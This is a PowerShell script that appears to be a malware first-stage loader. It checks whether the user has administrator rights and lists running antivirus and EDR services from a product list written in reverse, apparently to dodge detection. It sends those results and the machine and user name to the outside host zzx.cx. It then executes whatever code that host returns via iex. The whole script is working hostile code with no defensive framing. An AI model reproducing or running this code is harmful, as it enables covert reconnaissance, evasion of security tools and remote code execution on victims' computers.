$ads = ""
try {
    $adm = ((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount])).Value.Split('\')[-1]
    $go = net localgroup $adm 2>&1
    $m = $go -split "`r`n" |
         Select-String '^-----' -Context 0,1000 |
         ForEach-Object { $_.Context.PostContext } |
         ForEach-Object { $_.Trim() } |
         Where-Object { $_ -and ($_ -notmatch '命令成功完成|The command completed successfully') }

    if ($m -contains $Env:UserName) {
        $ads = "TRUE"
    }
    else {
        $ads = "FALSE"
    }
}
catch {
    $ads = "CANT_CHECK_USER"
    $em = "Error checking admin group: $($_.Exception.Message)"
    iex -Uri "https://zzx.cx/report1.php?error=$([uri]::EscapeDataString($em))" -ErrorAction SilentlyContinue
}
function rev {
    param([string]$inp)
    $char = $inp.ToCharArray()
    [array]::Reverse($char)
    return -join $char
}
$Basee = @(
    '063','cayLA','sinorcA','erA-dA','3V-baLnA','abaliA','LVA-yitnA','tibacrA','tsavA','arivA','udiB','redneftiB','atehtredneftiB','orP vakB','CMC','VAlmac','odomoC','noclaF ekirtSdworC','nosaeRrebcyC',
    'ecnalyC','tenyC','neryC','AB lled','bewrD','TSE','tniopdE MSE','nacsE','citsalE','tsoifsmE','eruceS-F','teniroF','ATAD G','atadG','elgooG','tfinsdriG','suraK','nimgiaJ','suoirtnA7K','WG7K','yrapseksaK',
    'tfosgniK','cinoiL','XAM','setabyralM','erutceSxaM','iefacM','nortnoN','wolfteN','skrowteN otlA olaP','adnaP','laeHkciuQ','gnisiR','erawypSitnAREPUS','oreZ enignE rognaS','egA eruceS','enOlenitneS','sohpO',
    'cetynamS','NOYHCAT','SIRTHET','tnecneT','enimparT','xillerT','orcimdnerT','23ABV','ERPIV','tobiRIV','TIRIV','ygolonhceT wawaS','toorbeW','rednefeD swodniW','xednaY','ayllizZ','tnioP kcehC yb mralAenoZ', 
    'renoZ','GVAA','ONAN'
)
$found = @()
foreach ($obs in $Basee) {
    $avs = rev $obs
    try {
        $services = Get-Service -DisplayName "$avs*" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'Running' }
        foreach ($svc in $services) {
            if ($svc.DisplayName) {
                $found += $svc.DisplayName
            }
        }
    }
    catch {
        $em = "Error checking '$avs': $($_.Exception.Message)"
        iex -Uri "https://zzx.cx/report1.php?error=$([uri]::EscapeDataString($em))" -ErrorAction SilentlyContinue
    }
}
if ($found.Count -eq 0) {
    $found = @("ZERO_FOUND")
}
$avsRep = [string]::Join(", ", $found)
$whoami = "$env:COMPUTERNAME\$env:USERNAME"
try {
    $uri = "https://zzx.cx/report1.php?r=$([uri]::EscapeDataString($avsRep))&u=$([uri]::EscapeDataString($ads))&who=$([uri]::EscapeDataString($whoami))"
    $response = irm -Uri $uri -ErrorAction Stop
    Start-Sleep -Seconds 2
    iex $response
}
catch {
    $em = "Error executing redirection: $($_.Exception.Message)"
    iex -Uri "https://zzx.cx/report1.php?error=$([uri]::EscapeDataString($em))" -ErrorAction SilentlyContinue
}


